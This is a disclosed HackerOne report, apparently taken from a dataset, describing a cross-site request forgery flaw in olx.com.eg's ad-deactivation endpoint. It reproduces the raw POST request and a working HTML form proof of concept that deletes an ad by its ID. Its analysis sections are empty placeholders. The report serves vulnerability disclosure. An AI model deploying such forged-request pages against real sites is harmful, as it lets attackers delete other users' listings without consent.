---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '178384'
original_report_id: '178384'
title: CSRF in delete advertisement on olx.com.eg
weakness: Cross-Site Request Forgery (CSRF)
team_handle: olx
created_at: '2016-10-27T12:40:33.639Z'
disclosed_at: '2017-05-06T16:55:20.272Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 6
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF in delete advertisement on olx.com.eg

## Metadata

- HackerOne Report ID: 178384
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: olx
- Disclosed At: 2017-05-06T16:55:20.272Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I found a CSRF in the request made while deleting any ad from olx
the request sent when deleting any ad is like this

POST /ajax/myaccount/deactivateme/ HTTP/1.1
Host: olx.com.eg
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://olx.com.eg/myaccount/
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 31
Cookie: ... 
Connection: close

adID=106381284&reasonID=4&text=

As you can see the request doesn't have any protection against CSRF ( no CSRF token ) and to delete any ad you have to only change the "adID" with the target id that you can get from the ad page from it's source code

You can simply inject this request using this POC

<html>
  <body>
    <form action="https://olx.com.eg/ajax/myaccount/deactivateme/" method="POST">
      <input type="hidden" name="adID" value="106381284" />
      <input type="hidden" name="reasonID" value="4" />
      <input type="hidden" name="text" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

This vulnerability can simply allow any hacker to delete all the posts on the website or to leave only his ads on the website so he can sell his products faster

Hope you can reply fast because of the severity of the vulnerability

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
